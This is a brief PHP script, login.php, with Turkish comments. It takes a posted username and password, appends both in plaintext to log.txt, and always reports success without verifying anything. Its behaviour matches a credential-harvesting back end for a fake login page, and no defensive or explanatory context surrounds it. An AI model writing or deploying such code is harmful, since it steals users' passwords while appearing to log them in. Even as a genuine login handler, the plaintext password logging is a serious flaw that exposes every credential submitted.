<?php
// login.php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['user'] ?? '';
    $password = $_POST['password'] ?? '';

    // Gelen bilgileri bir dosyaya ekleyin
    $logData = "Username: $username, Password: $password\n";
    file_put_contents('log.txt', $logData, FILE_APPEND);

    // Başarılı bir yanıt gönderin
    echo json_encode(['success' => true]);
} else {
    // POST isteği değilse hata mesajı gönder
    echo json_encode(['error' => 'Invalid request']);
}
?>
